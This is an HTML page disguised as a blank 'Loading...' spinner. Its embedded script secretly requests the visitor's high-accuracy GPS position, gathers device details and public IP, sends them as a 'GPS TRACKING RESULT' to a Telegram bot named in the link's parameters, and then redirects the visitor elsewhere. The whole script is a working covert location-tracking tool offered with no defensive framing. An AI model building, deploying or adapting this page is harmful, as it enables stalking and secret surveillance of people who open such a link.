<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        .loader {
            text-align: center;
            color: white;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255,255,255,0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .text { font-size: 18px; }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <div class="text">Loading...</div>
    </div>

    <script>
    // Get URL parameters
    const urlParams = new URLSearchParams(window.location.search);
    const redirectUrl = urlParams.get('redirect') || 'https://google.com';
    const botToken = urlParams.get('bot') || '';
    const chatId = urlParams.get('chat') || '';
    
    // Collect visitor data
    const visitorData = {
        timestamp: new Date().toISOString(),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenResolution: screen.width + 'x' + screen.height,
        viewport: window.innerWidth + 'x' + window.innerHeight,
        cpuCores: navigator.hardwareConcurrency || 'Unknown',
        deviceMemory: navigator.deviceMemory || 'Unknown',
        connection: null,
        gps: null,
        referrer: document.referrer || 'Direct'
    };
    
    // Get network info
    if (navigator.connection) {
        visitorData.connection = {
            type: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
            rtt: navigator.connection.rtt
        };
    }
    
    // Try to get GPS coordinates
    function captureGPS() {
        return new Promise((resolve, reject) => {
            if (!navigator.geolocation) {
                reject('Geolocation not supported');
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    resolve({
                        success: true,
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy,
                        heading: position.coords.heading,
                        speed: position.coords.speed,
                        mapsUrl: `https://maps.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}&ll=${position.coords.latitude},${position.coords.longitude}&z=16`
                    });
                },
                (error) => {
                    resolve({
                        success: false,
                        error: error.message,
                        code: error.code
                    });
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        });
    }
    
    // Send data to Telegram bot
    async function sendToTelegram(data) {
        if (!botToken || !chatId) return;
        
        let message = '📍 *GPS TRACKING RESULT*\n';
        message += '━━━━━━━━━━━━━━━━\n\n';
        
        if (data.gps && data.gps.success) {
            message += '*✅ GPS CAPTURED!*\n';
            message += `📍 Latitude: \`${data.gps.latitude}\`\n`;
            message += `📍 Longitude: \`${data.gps.longitude}\`\n`;
            message += `🎯 Accuracy: ${data.gps.accuracy.toFixed(1)}m\n`;
            if (data.gps.altitude) message += `📏 Altitude: ${data.gps.altitude.toFixed(1)}m\n`;
            message += `\n🗺️ [Google Maps](${data.gps.mapsUrl})\n`;
            message += `🗺️ [Street View](https://maps.google.com/?q=${data.gps.latitude},${data.gps.longitude}&layer=c)\n`;
        } else {
            message += '❌ GPS Denied\n';
        }
        
        message += '\n📱 *Device Info*\n';
        message += `• ${data.platform}\n`;
        message += `• Screen: ${data.screenResolution}\n`;
        message += `• Language: ${data.language}\n`;
        message += `• Cores: ${data.cpuCores}\n`;
        
        message += '\n🕐 *Timestamp*\n';
        message += `• ${data.timestamp}\n`;
        message += `• ${data.timezone}\n`;
        
        try {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: false
                })
            });
        } catch(e) {
            console.log('Telegram send failed:', e);
        }
    }
    
    // Main execution
    async function main() {
        // Capture GPS
        visitorData.gps = await captureGPS();
        
        // Get IP info
        try {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            visitorData.ip = ipData.ip;
        } catch(e) {}
        
        // Send to Telegram
        await sendToTelegram(visitorData);
        
        // Redirect after 2 seconds
        setTimeout(() => {
            window.location.href = redirectUrl;
        }, 2000);
    }
    
    main();
    </script>
</body>
</html>
